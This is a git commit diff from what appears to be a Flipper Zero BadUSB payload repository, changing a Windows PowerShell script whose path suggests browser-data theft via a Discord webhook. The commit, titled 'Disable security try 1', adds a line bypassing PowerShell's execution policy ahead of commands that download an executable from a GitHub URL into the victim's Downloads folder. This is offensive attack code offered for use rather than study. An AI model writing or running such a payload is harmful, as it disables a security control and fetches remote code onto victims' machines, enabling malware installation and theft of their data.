bea82667f920be74757d6c3b33466aca7ccea8fe
Chris <christophe.da.cruz.tic@gmail.com>
2024-01-27 12:09:57 +0100

    Disable security try 1

--- badusb/BrowserData/discord_wh_windows.ps1
+++ badusb/BrowserData/discord_wh_windows.ps1
@@ -1,3 +1,4 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force
 $url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
 $destination=[System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
 Invoke-WebRequest -Uri $url -OutFile $destination
